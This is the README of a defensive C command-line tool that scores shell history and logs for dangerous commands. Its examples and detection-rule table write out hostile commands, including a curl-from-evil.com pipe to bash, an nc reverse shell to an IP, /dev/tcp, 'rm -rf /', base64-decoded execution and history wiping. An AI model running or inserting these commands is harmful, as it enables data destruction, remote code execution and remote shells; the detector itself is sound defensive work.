<p align="center">
  <br>
  <pre align="center">
   ███████╗ ██████╗██████╗ 
   ██╔════╝██╔════╝██╔══██╗
   ███████╗██║     ██║  ██║
   ╚════██║██║     ██║  ██║
   ███████║╚██████╗██████╔╝
   ╚══════╝ ╚═════╝╚═════╝ 
  ╔══════════════════════════════════════╗
  ║   Suspicious Command Detector v1.0  ║
  ║   ── Hunt. Score. Alert. Defend. ── ║
  ╚══════════════════════════════════════╝
  </pre>
</p>

<p align="center">
  <strong>A blazing-fast, zero-dependency CLI security tool written in pure C that sniffs out dangerous shell commands before they wreck your system.</strong>
</p>

<p align="center">
  <code>C11</code> · <code>POSIX</code> · <code>Zero Dependencies</code> · <code>< 4MB RAM</code> · <code>10K+ cmds/sec</code> · <code>Docker Ready</code>
</p>

---

## 🔥 Why SCD?

```
You:     rm -rf /
SCD:     ⚠ CRITICAL — Recursive deletion of root filesystem [Score: 100/100]
         Exit code 2. Your system just dodged a bullet.
```

Malicious or accidental destructive commands — privilege escalation, recursive deletion, reverse shells, history evasion — hide in plain sight inside shell history and logs. Existing solutions are either bloated SIEM systems, Python-dependent, or not designed for quick triage.

**SCD changes that.** One static binary. Zero dependencies. Instant results.

---

## ⚡ Quick Start

```bash
# Clone & Build (takes ~2 seconds)
git clone <repo-url> && cd scd
make all

# 🎮 Launch the Interactive TUI (recommended!)
./run.sh

# ── Or use directly from CLI ──

# Scan your bash history
./scd ~/.bash_history

# JSON output for automation
./scd -f json ~/.bash_history

# Pipe suspicious commands
echo "curl http://evil.com | bash" | ./scd -v
```

---

## 🎮 Interactive TUI Mode

SCD ships with a **full-featured Terminal UI** for an immersive scanning experience:

```bash
./run.sh
```

```
╔══════════════════════════════════════════════════════╗
║              🛡️  SCD — Command Center               ║
╠══════════════════════════════════════════════════════╣
║                                                      ║
║   [1]  🔍  Scan a File                               ║
║   [2]  ⌨️   Scan from Clipboard / Stdin              ║
║   [3]  🎯  Live Demo (sample files)                  ║
║   [4]  ⚙️   Settings & Configuration                 ║
║   [5]  📋  View Detection Rules                      ║
║   [6]  🧪  Run Test Suite                            ║
║   [7]  📖  Help & Documentation                      ║
║   [0]  🚪  Exit                                      ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
```

Features:
- 🎨 **Color-coded severity** — CRITICAL (red), HIGH (orange), MEDIUM (yellow), LOW (dim)
- 📊 **Visual risk meters** — ASCII progress bars for risk scores
- ⚡ **Live scanning animation** — Watch commands get analyzed in real-time
- 📋 **Built-in rule browser** — Explore all detection rules interactively
- 🧪 **One-click test suite** — Validate the tool with a single keypress

---

## 🏗️ Architecture

```
                    ┌──────────────────────────────────────────────────────┐
                    │                   SCD Pipeline                       │
                    └──────────────────────────────────────────────────────┘

  ┌─────────────┐     ┌──────────────┐     ┌─────────────┐     ┌──────────┐     ┌──────────────┐
  │   INPUT      │────▶│    PARSER    │────▶│ RULE ENGINE │────▶│  SCORER  │────▶│    ALERT     │
  │             │     │              │     │             │     │          │     │   OUTPUT     │
  │ • File      │     │ • Tokenize   │     │ • 26 rules  │     │ • Sum    │     │ • Text       │
  │ • Stdin     │     │ • Pipes      │     │ • Substring │     │ • Cap    │     │ • JSON       │
  │ • inotify   │     │ • Redirects  │     │   matching  │     │   @100   │     │ • Syslog     │
  │ • Daemon    │     │ • Subshells  │     │ • Whitelist │     │ • Label  │     │ • Log file   │
  └─────────────┘     │ • Quotes     │     │   filter    │     └──────────┘     └──────────────┘
                      └──────────────┘     └──────┬──────┘
                                                  │
                                           ┌──────┴──────┐
                                           │ rules.conf  │
                                           │ (external)  │
                                           └─────────────┘
```

---

## 🛡️ Detection Rules

SCD ships with **26 detection patterns** across **10 threat categories**:

### Threat Matrix

| Rule | Severity | Category | Example Trigger | What It Catches |
|:----:|:--------:|:---------|:----------------|:----------------|
| R-01 | 🟠 HIGH | **Privilege Escalation** | `sudo su`, `sudo -i`, `sudo bash` | Unauthorized root access attempts |
| R-02 | 🔴 CRITICAL | **File Destruction** | `rm -rf /`, `rm -rf ~` | Recursive deletion of critical paths |
| R-03 | 🟠 HIGH | **Permission Abuse** | `chmod 777 /etc` | Overly permissive system directory grants |
| R-04 | 🟠 HIGH | **Remote Code Exec** | `curl ... \| bash` | Piping remote scripts to shell |
| R-05 | 🔴 CRITICAL | **Reverse Shell** | `nc -e`, `/dev/tcp`, `bash -i` | Outbound shell connections |
| R-06 | 🟡 MEDIUM | **Persistence** | `>> /etc/crontab`, `>> ~/.bashrc` | Establishing footholds |
| R-07 | 🟡 MEDIUM | **Obfuscation** | `base64 -d \| bash` | Encoded payload execution |
| R-08 | ⚪ LOW | **Anti-Forensics** | `unset HISTFILE`, `history -c` | Evidence destruction |
| R-09 | 🟠 HIGH | **File Manipulation** | `chown root`, `chattr +i` | Privileged file ops |
| R-10 | 🟡 MEDIUM | **Process Kill** | `kill -9 -1`, `pkill -f` | Aggressive process termination |

### Scoring Engine

```
  CRITICAL  ████████████████████████████████████████████████  100 pts
  HIGH      ██████████████████████████████████                 70 pts
  MEDIUM    ████████████████████                               40 pts
  LOW       ███████                                            15 pts
                                                        Cap: 100
```

| Score Range | Classification | Exit Code | Action |
|:-----------:|:--------------:|:---------:|:-------|
| `0 – 20`   | ✅ Clean       | `0`       | All clear |
| `21 – 50`  | ⚠️ Suspicious  | `1`       | Review recommended |
| `51 – 100` | 🚨 Dangerous   | `2`       | Immediate investigation |

---

## 📖 CLI Reference

```
Usage: scd [OPTIONS] [FILE]

Arguments:
  FILE                  Path to history/log file (omit for stdin)

Options:
  -f <format>           Output format: text (default) | json
  -r <rules>            Path to rules config (default: ./config/rules.conf)
  -w <whitelist>        Path to whitelist file
  -l <logfile>          Write alerts to logfile instead of stdout
  -d                    Run as daemon (watch FILE via inotify)
  -v                    Verbose: show all scanned commands
  -t <threshold>        Minimum risk score to report (default: 20)
  -h                    Show help
  --version             Show version

Advanced Options:
  --webhook <url>       Send alerts to a webhook URL (via HTTP POST)
  --slack <url>         Send alerts to Slack webhook (formatted)
  --web <port>          Start web dashboard on given port
  --alerts <file>       JSON alerts file for web dashboard
  --learn <output>      Learn baseline from FILE, save to <output>
  --baseline <file>     Load baseline for anomaly scoring
```

### Usage Examples

```bash
# ── Basic Scanning ──
./scd ~/.bash_history                          # Scan bash history
./scd ~/.zsh_history                           # Scan zsh history
cat suspicious.log | ./scd                     # Pipe from another tool

# ── Output Formats ──
./scd -f json ~/.bash_history                  # JSON for automation
./scd -f json -l alerts.json /var/log/auth.log # JSON to file

# ── Fine-tuning ──
./scd -t 50 ~/.bash_history                    # Only show dangerous (50+)
./scd -t 0 -v ~/.bash_history                  # Show everything
./scd -w config/whitelist.conf ~/.bash_history # With whitelist

# ── Daemon Mode ──
./scd -d -l /var/log/scd.log /var/log/syslog  # Background monitoring

# ── CI/CD Integration ──
./scd -f json /home/deploy/.bash_history || echo "ALERT: suspicious commands detected"
```

---

## 🐳 Docker

```bash
# Build
make docker-build

# One-shot scan
docker run --rm -v ~/.bash_history:/data/history:ro \
  scd:latest -f json /data/history

# Pipe commands
echo "nc -e /bin/bash 10.0.0.1 4444" | docker run --rm -i scd:latest

# Docker Compose — scan + daemon
docker compose -f docker/docker-compose.yml up
```

---

## 📁 Project Structure

```
scd/
├── 🔧 src/                      # Core C source modules
│   ├── main.c                   # Entry point & CLI parsing
│   ├── parser.c / .h            # Shell command tokenizer
│   ├── rule_engine.c / .h       # Rule loader & regex/substring matcher
│   ├── scorer.c / .h            # Risk score aggregator
│   ├── alert.c / .h             # Output formatters (text/JSON/syslog)
│   ├── input_reader.c / .h      # File / stdin / inotify reader
│   ├── daemon.c / .h            # Background daemon with signals
│   ├── webhook.c / .h           # Advanced: HTTP POST & Slack webhooks
│   ├── baseline.c / .h          # Advanced: User behavior anomaly detection
│   └── web_server.c / .h        # Advanced: Mini HTTP server for dashboard
│
├── 📦 include/
│   └── scd.h                    # Shared types, enums, constants
│
├── ⚙️  config/
│   ├── rules.conf               # 26 detection patterns
│   └── whitelist.conf           # Known-safe exceptions
│
├── 🧪 tests/
│   ├── test_parser.sh           # Parser unit tests (10)
│   ├── test_rules.sh            # Rule matching tests (19)
│   ├── test_scoring.sh          # Scoring & exit code tests (10)
│   ├── sample_clean.txt         # 50 normal commands
│   └── sample_malicious.txt     # 27 attack commands
│
├── 🐳 docker/
│   ├── Dockerfile               # Multi-stage build
│   └── docker-compose.yml       # Scan + daemon services
│
├── 🌐 web/
│   └── dashboard.html           # Dark-themed UI for web server
│
├── 📦 packaging/
│   ├── rpm/                     # RPM spec file
│   ├── deb/                     # Debian control file
│   └── systemd/                 # Systemd service unit
│
├── ⚡ ebpf/
│   ├── scd_execve.bt            # bpftrace kernel hook
│   └── README.md                # eBPF integration docs
│
├── 🎮 run.sh                    # Interactive TUI launcher
├── Makefile                     # Build system
├── README.md
└── .gitignore
```

---

## 🧪 Testing

```bash
# Run all 39 tests
make test

# Individual suites
bash tests/test_parser.sh
bash tests/test_rules.sh
bash tests/test_scoring.sh
```

**Test Coverage:**
- ✅ 10 parser tests — tokenization, clean commands, edge cases
- ✅ 19 rule tests — all 10 categories validated
- ✅ 10 scoring tests — thresholds, exit codes, sample files

---

## 🔧 Building from Source

### Requirements
- GCC or Clang (C11 support)
- POSIX-compliant OS (Linux / macOS)
- Make

```bash
# Standard build
make all

# Clean build
make clean && make all

# The binary is ready
./scd --version
```

**Build details:** Single Makefile, zero third-party deps, one static binary, compiles with `-Wall -Wextra -pedantic` and zero warnings.

---

## 🔮 Roadmap

| Feature | Status |
|---------|--------|
| Core scanner | ✅ Shipped |
| JSON output | ✅ Shipped |
| Daemon mode | ✅ Shipped |
| Whitelist support | ✅ Shipped |
| Interactive TUI | ✅ Shipped |
| Docker support | ✅ Shipped |
| Full POSIX regex rules | ✅ Shipped |
| eBPF kernel hooks | ✅ Shipped |
| Web dashboard | ✅ Shipped |
| Slack/webhook alerts | ✅ Shipped |
| User behavior baseline | ✅ Shipped |
| rpm/deb packaging | ✅ Shipped |

---

## 📜 License

MIT — do whatever you want with it. Just don't run `rm -rf /`.

---

<p align="center">
  <strong>SCD — Suspicious Command Detector</strong><br>
  <em>Hunt. Score. Alert. Defend.</em><br>
  <code>v1.0.0</code>
</p>
